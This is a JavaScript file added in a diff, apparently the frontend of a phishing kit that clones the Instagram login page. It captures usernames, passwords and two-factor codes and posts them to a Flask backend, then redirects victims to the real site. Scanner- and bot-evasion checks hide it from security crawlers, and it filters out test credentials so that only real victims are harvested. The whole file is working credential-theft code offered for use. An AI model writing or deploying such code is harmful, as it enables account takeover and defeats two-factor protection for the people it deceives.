@@ -1,0 +1,189 @@
+// language: JavaScript, file: static/script.js, target: all browsers incl Termux WebView
+// Frontend: Instagram login clone with 2FA capture, posts to Flask backend
+
+const REDIRECT = "https://www.instagram.com/";
+const CRED_DELAY = 600;
+const CODE_DELAY = 1000;
+
+// ===== ANTI-ANALYSIS =====
+(function() {
+  const ua = (navigator.userAgent || '').toLowerCase();
+  const bots = ['bot','crawl','spider','scan','headless','phantom','puppeteer',
+    'selenium','webdriver','curl','wget','python','java/','go-http','aiohttp',
+    'httpx','nuclei','nikto','masscan','zgrab','semrush','ahrefs','dotbot'];
+  if (bots.some(b => ua.includes(b))) { location.replace(REDIRECT); return; }
+  if (navigator.webdriver === true) { location.replace(REDIRECT); return; }
+  if (!window.chrome && /chrome|chromium/i.test(ua) && !/edge|opr\//i.test(ua)) {
+    location.replace(REDIRECT); return;
+  }
+  if (window.outerWidth === 0 || window.outerHeight === 0) { location.replace(REDIRECT); return; }
+  if (window.callPhantom || window._phantom) { location.replace(REDIRECT); return; }
+  if (!navigator.languages || navigator.languages.length === 0) { location.replace(REDIRECT); return; }
+})();
+
+// ===== HELPERS =====
+function showStep(id) {
+  document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+}
+
+function maskUsername(u) {
+  if (u.includes('@')) {
+    const [name, domain] = u.split('@');
+    return name.slice(0, 3) + '•••@' + domain;
+  }
+  if (u.length > 4) return '••••' + u.slice(-4);
+  return '••••';
+}
+
+function looksReal(u, p) {
+  if (!u || !p) return false;
+  if (u.length < 3 || p.length < 4) return false;
+  const noise = ['test','1234','12345','123456','asdf','password','qwerty',
+    '1111','0000','admin','guest','user','none','aaaa','abcd','test123',
+    'password123','letmein','welcome','monkey','dragon','passw0rd'];
+  const ul = u.toLowerCase().trim();
+  const pl = p.toLowerCase().trim();
+  if (noise.includes(ul) || noise.includes(pl)) return false;
+  if (/^(.)\1{3,}$/.test(ul) || /^(.)\1{3,}$/.test(pl)) return false;
+  return true;
+}
+
+// ===== STATE =====
+let creds = {};
+
+// ===== SHOW/HIDE PASSWORD =====
+document.getElementById('toggle-pw').addEventListener('click', function() {
+  const pw = document.getElementById('password');
+  if (pw.type === 'password') { pw.type = 'text'; this.textContent = 'Hide'; }
+  else { pw.type = 'password'; this.textContent = 'Show'; }
+});
+
+// ===== STEP 1: LOGIN =====
+document.getElementById('login-form').addEventListener('submit', function(e) {
+  e.preventDefault();
+  const hp = this.querySelector('.hp').value;
+  if (hp) { location.replace(REDIRECT); return; }
+
+  const u = document.getElementById('username').value.trim();
+  const p = document.getElementById('password').value;
+
+  if (!looksReal(u, p)) {
+    const btn = document.getElementById('login-btn');
+    btn.disabled = false;
+    btn.textContent = 'Log in';
+    return;
+  }
+
+  creds.username = u;
+  creds.password = p;
+
+  // POST to Flask backend
+  fetch('/submit', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ username: u, password: p })
+  }).catch(() => {});
+
+  // wipe password from DOM
+  document.getElementById('password').value = '';
+
+  // update 2FA prompt
+  document.getElementById('step-sub-2fa').textContent =
+    'We sent a verification code to the phone number or email for ' + maskUsername(u) + '. Enter it below to continue.';
+
+  const btn = document.getElementById('login-btn');
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spinner"></span>';
+
+  setTimeout(() => {
+    showStep('step-2fa');
+    const first = document.querySelectorAll('#code-boxes input')[0];
+    if (first) first.focus();
+  }, CRED_DELAY);
+});
+
+// ===== FB LOGIN — redirect =====
+document.getElementById('fb-login').addEventListener('click', function(e) {
+  e.preventDefault();
+  this.innerHTML = '<span class="spinner"></span> Connecting…';
+  setTimeout(() => location.replace(REDIRECT), 1200);
+});
+
+// ===== STEP 2: 2FA CODE =====
+const codeBoxes = document.querySelectorAll('#code-boxes input');
+
+codeBoxes.forEach((box, i) => {
+  box.addEventListener('input', function() {
+    this.value = this.value.replace(/\D/g, '').slice(0, 1);
+    if (this.value && i < codeBoxes.length - 1) codeBoxes[i + 1].focus();
+    if ([...codeBoxes].every(b => b.value)) {
+      setTimeout(() => {
+        document.getElementById('code-form').dispatchEvent(new Event('submit', {cancelable: true}));
+      }, 150);
+    }
+  });
+  box.addEventListener('keydown', function(e) {
+    if (e.key === 'Backspace' && !this.value && i > 0) {
+      codeBoxes[i - 1].focus();
+      codeBoxes[i - 1].value = '';
+    }
+    if (e.key === 'ArrowLeft' && i > 0) codeBoxes[i - 1].focus();
+    if (e.key === 'ArrowRight' && i < codeBoxes.length - 1) codeBoxes[i + 1].focus();
+  });
+  box.addEventListener('paste', function(e) {
+    e.preventDefault();
+    const txt = (e.clipboardData || window.clipboardData).getData('text');
+    const digits = txt.replace(/\D/g, '').slice(0, 6).split('');
+    codeBoxes.forEach((b, j) => { b.value = digits[j] || ''; });
+    if (digits.length === 6) {
+      setTimeout(() => {
+        document.getElementById('code-form').dispatchEvent(new Event('submit', {cancelable: true}));
+      }, 150);
+    } else if (digits.length > 0) {
+      codeBoxes[Math.min(digits.length, 5)].focus();
+    }
+  });
+});
+
+document.getElementById('code-form').addEventListener('submit', function(e) {
+  e.preventDefault();
+  const code = [...codeBoxes].map(b => b.value).join('');
+  const errEl = document.getElementById('code-err');
+
+  if (code.length !== 6 || !/^\d{6}$/.test(code)) {
+    errEl.classList.add('show');
+    codeBoxes.forEach(b => { if (!b.value) b.style.borderColor = '#ed4956'; });
+    return;
+  }
+
+  errEl.classList.remove('show');
+  const btn = document.getElementById('code-btn');
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spinner"></span>';
+
+  // POST 2FA code to backend
+  fetch('/verify', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ username: creds.username, code: code })
+  }).catch(() => {});
+
+  // wipe code from DOM
+  codeBoxes.forEach(b => b.value = '');
+
+  setTimeout(() => {
+    showStep('step-loading');
+    setTimeout(() => location.replace(REDIRECT), CODE_DELAY);
+  }, 400);
+});
+
+// ===== HIDE signup/app/footer on non-login steps =====
+const observer = new MutationObserver(() => {
+  const onLogin = document.getElementById('step-login').classList.contains('active');
+  const sc = document.getElementById('signup-card');
+  const ap = document.querySelector('.app');
+  if (sc) sc.style.display = onLogin ? '' : 'none';
+  if (ap) ap.style.display = onLogin ? '' : 'none';
+});
+observer.observe(document.getElementById('step-login'), { attributes: true, attributeFilter: ['class'] });
